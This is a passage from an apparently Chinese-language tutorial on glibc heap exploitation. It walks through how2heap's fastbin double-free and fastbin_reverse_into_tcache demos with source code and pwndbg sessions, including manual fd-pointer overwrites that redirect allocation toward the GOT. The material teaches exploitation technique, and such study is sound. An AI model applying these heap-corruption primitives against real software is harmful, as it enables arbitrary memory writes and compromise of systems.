class="number">44</span> c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"> ► <span class="number">45</span> <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">   <span class="number">46</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">48</span></span><br><span class="line">   <span class="number">49</span> assert(a == c);</span><br><span class="line">   <span class="number">50</span> &#125;</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe230</span> ◂— <span class="number">0x700000008</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe238</span> —▸ <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe240</span> —▸ <span class="number">0x5555555593c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe248</span> —▸ <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe250</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe258</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe268</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— ...</span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">555555555428</span> main+<span class="number">511</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">16</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">17</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593c0</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br></pre></td></tr></table></figure><p>就会存在两个指针指向同一块 chunk，通常而言我们的下一步利用会找一个 size 符合当前fastbin 链的地址（_int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。），然后在分配出 chunk a 的同时修改 chunk a 的 fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax r8  <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x5555555593b8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x5555555593c0</span> —▸ <span class="number">0x555555559390</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x5555555593c8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x5555555593d8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"></span><br><span class="line">## 修改 fd</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x5555555593c0</span>=<span class="number">0x555555557f78</span></span><br><span class="line">## 设置size 符合 fastbin链</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x555555557f80</span>=<span class="number">0x21</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x5555555593c0</span> —▸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x5555555593c8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x5555555593d8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x5555555593e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x5555555593f8</span> ◂— <span class="number">0x20c11</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555557f78</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555557f80</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br></pre></td></tr></table></figure><p>此时fastbin 链的结构就会被修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x555555559320</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x5555555593b0</span> —▸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br></pre></td></tr></table></figure><p>当执行到 分配 c chunk 的时候 ，我们就会拿到目标内存，总结一下就是</p><p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。</p><p>完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">                ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">        <span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">        a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-fastbin-reverse-into-tcache"><a href="#2-fastbin-reverse-into-tcache" class="headerlink" title="2. fastbin_reverse_into_tcache"></a>2. fastbin_reverse_into_tcache</h3><p>首先分配一定数量的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">19</span>   <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="number">20</span>   <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="number">21</span>   <span class="keyword">size_t</span> i;</span><br><span class="line">► <span class="number">22</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">  <span class="number">23</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="number">24</span>   &#125;</span><br></pre></td></tr></table></figure><p>然后 free 填充 tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">31</span>   <span class="comment">// Fill the tcache.</span></span><br><span class="line"> ► <span class="number">32</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">33</span>     <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">   <span class="number">34</span>   &#125;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x555555559480</span> —▸ <span class="number">0x555555559430</span> —▸ <span class="number">0x5555555593e0</span> —▸ <span class="number">0x555555559390</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x5555555592f0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>释放我们的目标 chunk 即这里的 ptrs[7]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">  <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">  victim</span><br><span class="line">);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>释放剩下的 8-14 的chunk</p><p>然后假设我们有一个堆溢出漏洞，可以覆盖 victim 的内容，我们此时将 栈上构造好的一个 list的地址赋予 victim </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">75</span>   <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">   <span class="number">76</span></span><br><span class="line">   <span class="number">77</span>   <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line"> ► <span class="number">78</span>   *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>   <span class="comment">//------------------------------------</span></span><br><span class="line">  ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p victim</span><br><span class="line">$<span class="number">1</span> = <span class="number">0x5555555594d0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594d0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax  <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x5555555594d8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br></pre></td></tr></table></figure><p>接下来，我们 malloc 7次 清空 tcache bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">86</span>   <span class="comment">// Empty tcache.</span></span><br><span class="line">   <span class="number">87</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">88</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">89</span>   &#125;</span><br><span class="line">   <span class="number">90</span></span><br><span class="line"> ► <span class="number">91</span>   <span class="built_in">printf</span>(</span><br><span class="line">   <span class="number">92</span>     <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">   <span class="number">93</span>     <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">   <span class="number">94</span>   );</span><br><span class="line">   <span class="number">95</span></span><br><span class="line">   <span class="number">96</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x7</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe1f8</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555540</span>a main+<span class="number">481</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> —▸ <span class="number">0x555555559650</span> —▸ <span class="number">0x555555559600</span> —▸ <span class="number">0x5555555595b0</span> —▸ <span class="number">0x555555559560</span> ◂— ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>我们发现 fastbin 的最后一个的 fd被我们写成了 stack 的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> —▸ <span class="number">0x555555559650</span> —▸ <span class="number">0x555555559600</span> —▸ <span class="number">0x5555555595b0</span> —▸ <span class="number">0x555555559560</span> ◂— ...</span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559560</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555559560</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555559568</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x555555559570</span> —▸ <span class="number">0x555555559510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x555555559578</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555559510</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555559510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555559518</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x555555559520</span> —▸ <span class="number">0x5555555594c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x555555559528</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x5555555594c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x5555555594c8</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x5555555594d8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时我们 malloc 一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 